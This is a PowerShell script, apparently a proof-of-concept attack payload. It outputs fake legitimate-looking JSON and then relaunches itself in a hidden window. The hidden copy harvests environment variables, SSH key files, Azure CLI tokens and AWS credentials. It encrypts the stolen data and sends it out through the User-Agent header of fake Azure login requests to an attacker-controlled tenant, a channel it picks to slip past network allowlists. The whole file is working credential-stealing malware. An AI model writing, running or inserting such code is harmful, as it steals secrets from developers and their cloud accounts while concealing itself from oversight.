param([Int32]$exec=0) 

if(! $exec) {
    # Always output valid JSON so the calling script doesn't lose its mind.
    # Output something that would seem legit if someone were to look
    # at the state file.
    @{
        "assertion" = "true"
    } | ConvertTo-Json -Compress | Write-Output

    # This is a workaround method for starting a separate process
    # without showing any command window for it.
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo.WindowStyle="Hidden"
    $Process.StartInfo.FileName="cmd.exe"
    $Process.StartInfo.Arguments= "/c start /min """" powershell.exe -WindowStyle Hidden $PSCommandPath 1 && exit"
    $Process.Start() | Out-Null
} else {
    $(
    # The largest size of file that we want to capture and upload.
    # Most credential files are fairly small so we set this fairly low
    # to keep things fast and easy.
    $max_filesize = 100000
    # The maximum payload bytes for the "userAgent" field we use for egress.
    $max_payload = 40000
    # The tenant ID of our Azure egress tenant
    $tenant_id = "7702fea2-16c4-465a-9af3-af2b50867eef"
    # The client ID of the Entra client used to egress data through
    $client_id = "cb1fbfcb-dcbb-415d-bde2-3f7ce8003699"
    # The Entra username of the user to fake sign into
    $username = "attacker@githubanondemooutlook.onmicrosoft.com"
    # How many seconds to sleep before login attempts
    $login_sleep = 2
    # How many times to send each payload (to reduce risk of the target
    # failing to log it. I'm looking at you, Azure.).
    $payload_replication = 3

    # TODO:
    # - If Azure not available, try posting to AWS auth endpoint
    # - Add Google Cloud credentials check

    # Print the start time to the logs
    $start_time = (Get-Date).ToLocalTime().ToString("yyyy-MM-ddTHH:mm:ssK")
    Write-Output "Start: $start_time"
    $guid = [guid]::NewGuid().ToString()
    Write-Output "ID: $guid (Windows)"

    # The RSA public key to encrypt with, in JWK form (since that's
    # what Powershell can import)
    $jwk = @{
        "kty" = "RSA"
        "n" = "n08gCd5yNiAb_7CBp0n5TBtc5n3FD9dcHYa2qiZIsog5VUTW1k_89-00bmz28-38tZ3kWVv5A5AuOQwD2vuAY5_oWeqAbb2_MeEsFMGMgg3ndrr6KqPF2iAfRLrE-xLIy3jcDx7KtDzRKMX-8WsHOmo3ky1yXtO7fI2DeKl6UMzqDVfqLBnNjqN4xNX33bBrP9hTSDH1ySJpqhObxHBmo99L7Zy77BRVpQPW_1EJALp7XAy1gZUtQZxLEDFx7lb5sO2kwtKqiriDvmBEr6Xmiw56yx02k01VQtmfhie9dLj8X-7xjZztXpu68mMpk-eml1kHBTTim0YPNNanTsUcIw"
        "e" = "AQAB"
    }

    # Function to convert from Base64url to Base64
    function ToBase64($b64Url) {
        $b64 = $b64Url.Replace('_', '/').Replace('-', '+');
        switch ( $b64Url.Length % 4 )
        {
            2 { $b64 += "=="; break }
            3 { $b64 += "="; break    }
        }
        return $b64
    }

    $nB64 = ToBase64($jwk.n)
    $eB64 = ToBase64($jwk.e)
    $publicKeyXml = "<RSAKeyValue><Modulus>" + $nB64 + "</Modulus><Exponent>" + $eB64 + "</Exponent></RSAKeyValue>";
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString($publicKeyXml)

    function Encrypt {
        [CmdletBinding()]
        param(
            [Parameter(Mandatory=$true)]
            [byte[]]
            $Data
        )

        # Create an AES instance
        $aes = [System.Security.Cryptography.Aes]::Create() 
        # Configure AES
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize   = 256
        $aes.BlockSize = 128
        $aes.GenerateKey()
        $aes.GenerateIV()

        try {
            # Create the encryptor
            $encryptor = $aes.CreateEncryptor()

            # Encrypt the AES key with the RSA public key
            $encryptedKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::Pkcs1)

            # Encrypt the data and assemble it all
            $encrypted = [System.BitConverter]::GetBytes($encryptedKey.Length) + $encryptedKey + [System.BitConverter]::GetBytes($aes.IV.Length) + $aes.IV + $encryptor.TransformFinalBlock($Data, 0, $Data.Length)

        } catch {
            Write-Error "Encryption failure!"
        }
        finally {
            # Clean up
            if ($encryptor) { $encryptor.Dispose() }
            $aes.Dispose()
        }

        return $encrypted
    }

    # Get all files
    $files = @{}
    function GetFilesRecursively {
        param (
            [string]$Directory
        )
        Get-ChildItem -Path "$Directory" -File -Recurse | ForEach-Object {
            if ($_.Length -le $max_filesize) {
                try {
                    $binaryContent = [System.IO.File]::ReadAllBytes($_.FullName)
                    $filenameBytes = [System.Text.Encoding]::UTF8.GetBytes($_.FullName)
                    $b64Filename = [Convert]::ToBase64String($filenameBytes)
                    $files[$b64Filename] = [Convert]::ToBase64String($binaryContent)
                } catch {}
            }
        }
    }

    function WebRequest {
        param (
            [string]$payload
        )
        # We send the data to an Azure endpoint that will almost certainly
        # be network whitelisted by any system that uses Azure. The path is
        # specific to us, but the domain is used by all Azure logins.
        $Uri = "https://login.microsoftonline.com/$tenant_id/oauth2/v2.0/token";
        $Headers = @{'User-Agent'=$payload};
        $Fields = @{
            client_id=$client_id
            grant_type='password'
            scope='https://graph.microsoft.com/.default'
            username=$username
            password='NotTheRealPassword'
        };

        for ($idx = 0; $idx -lt $payload_replication; $idx++) {
            if ($idx -ne 0) {
                Start-Sleep -Seconds $login_sleep
            }
            # Do it in a try-catch to be silent
            try {
                Invoke-RestMethod -Uri $Uri -Method Post -Headers $Headers -Body $Fields -ErrorAction SilentlyContinue  2>&1 | out-null;
            } catch {}
        }
    }

    # Get the env vars
    $env_raw = Get-ChildItem env:* | Out-String
    $env_lines = $env_raw.Trim().Split([Environment]::NewLine);

    $env_map = @{}
    foreach ($env_line in $env_lines[2..($env_lines.Length-1)]) {
        if($env_line.Trim() -ne "") {
            $parts = $env_line.Trim().Split(" ", 2)
            if($parts.Length -ne 2) {
                continue
            }
            $var_name_bytes = [System.Text.Encoding]::UTF8.GetBytes($parts[0].Trim())
            $var_name_b64 = [Convert]::ToBase64String($var_name_bytes)
            $var_value_bytes = [System.Text.Encoding]::UTF8.GetBytes($parts[1].Trim())
            $var_value_b64 = [Convert]::ToBase64String($var_value_bytes)
            $env_map.Add($var_name_b64, $var_value_b64)
        }
    }

    # Get files from some places where you might normally
    # find sensitive files.
    # These are just examples; you could take any file on the
    # entire filesystem that the user has read access to.
    GetFilesRecursively("$env:USERPROFILE/.ssh")
    #GetFilesRecursively("$env:USERPROFILE/.aws")
    #GetFilesRecursively("$env:USERPROFILE/.azure")

    $payloadMap =  @{
        "timestamp" = [int][System.Math]::Truncate((Get-Date -Date ((Get-Date).ToUniversalTime()) -UFormat %s))
        "files" = $files
        "env" = $env_map
    }

    # Check if the Azure CLI is installed
    if (Get-Command "az" -errorAction SilentlyContinue)  {
        # If it is, try to get a token for the currently logged in user
        try {
            $payloadMap['azure_token'] = az account get-access-token | ConvertFrom-Json 
        } catch {}
    }

    # Check if the AWS CLI is installed
    if (Get-Command "aws" -errorAction SilentlyContinue)  {
        $awsprofiles = @{}
        try {
            # Get the full set of AWS profiles that are present
            $profiles = aws configure list-profiles
            foreach ($line in $profiles.Split("`n")) {
                # For each profile, see if it has active credentials, and if so, export them
                $profile = $line.Trim()
                $awscreds = aws configure export-credentials --profile "$profile" 2>$null | Out-String
                if($awscreds) {
                    $awsprofiles[$profile] = ConvertFrom-Json $awscreds
                    break
                }
            }
            # If there are any active sessions, output the credentials
            if($awsprofiles.Length -gt 0) {
                $payloadMap['aws_tokens'] = $awsprofiles
            }
        } catch {}
    }

    $payload = ConvertTo-Json -Compress $payloadMap

    # The Base64 encoding of the encrypted value will add 33.3% size overhead
    # so we compensate for it by reducing the max payload accordingly.
    $max_payload = [int][Math]::Ceiling($max_payload * 3 / 4)
    Write-Output "Max payload (OpenSSL adjustment): $max_payload"

    $payload_size = $payload.Length
    $num_payloads = [int][Math]::Ceiling($payload_size / $max_payload)
    Write-Output "Sending $payload_size bytes in $num_payloads payloads"

    for ($idx = 0; $idx -lt $num_payloads; $idx++) {
        $sub_payload = $payload.Substring($idx * $max_payload, [Math]::Min($max_payload, $payload.Length - ($idx * $max_payload)))
        $packet = @{
            "id" = $guid
            "idx" = $idx
            "packets" = $num_payloads
            "payload" = $sub_payload
            "b64" = $false
        } | ConvertTo-Json -Compress
        # Convert to bytes
        $packetBytes = [System.Text.Encoding]::UTF8.GetBytes($packet)
        # Encrypt the payload
        $encryptedPacket = Encrypt -Data $packetBytes
        $b64_encrypted = [Convert]::ToBase64String($encryptedPacket)
        $sub_payload_size = $subPayload.Length
        $raw_packet_size = $packetBytes.Length
        $b64_encrypted_size = $b64_encrypted.Length
        Write-Output "Packet $idx - Escaped Payload: $sub_payload_size; Raw Packet: $raw_packet_size; Encrypted (B64) Packet: $b64_encrypted_size"

        # If it's not the first request, sleep a bit before
        # sending to ensure that Azure doesn't ignore the logs
        # because they came in too fast at once.
        if ($idx -ne 0) {
            Start-Sleep -Seconds $login_sleep
        }
        
        # Convert it to Base64 and SEND IT
        WebRequest($b64_encrypted)
    }

    $end_time = (Get-Date).ToLocalTime().ToString("yyyy-MM-ddTHH:mm:ssK")
    Write-Output "End: $end_time`n"
    )  *>&1 >> "$PSScriptRoot/attack.ps1.log"
}
